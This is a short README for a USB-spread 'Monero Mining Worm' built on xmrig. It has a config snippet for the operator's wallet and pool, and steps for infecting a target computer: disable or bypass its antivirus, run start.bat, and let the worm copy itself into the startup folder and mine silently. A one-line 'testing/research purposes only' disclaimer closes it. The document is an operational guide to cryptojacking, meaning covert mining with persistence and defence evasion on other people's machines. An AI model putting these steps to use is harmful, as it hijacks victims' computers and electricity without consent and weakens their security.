# Monero Mining Worm
Monero Mining worm. Spreads manually on a USB stick (only one file to start and the target computer is affected.)


# Setup

You will start by needing a Monero address and a monero mining pool, (MoneroOcean is default).

1. Navigate to xmrig/config.json and edit the following lines:

```json
{
   "url": "gulf.moneroocean.stream:10064 ", # mining pool url (leave as default if you don't know what a mining pool is)
   "user": "MONERO-ADDRESS-HERE", # your Monero address
   "pass": "hidden", # name of the machine that will be displayed on the mining pool
}
```

2. copy the code onto a USB drive
3. Setup Complete

# Spreading Process

1. Disable the antivirus on the target computer or add an exception for xmrig
2. Plug the USB drive into the computer or download your program from the cloud
3. Run start.bat. The worm will copy itself to the startup folder and will silently start mining Monero for you.

# This project is intended for testing/research purposes only.
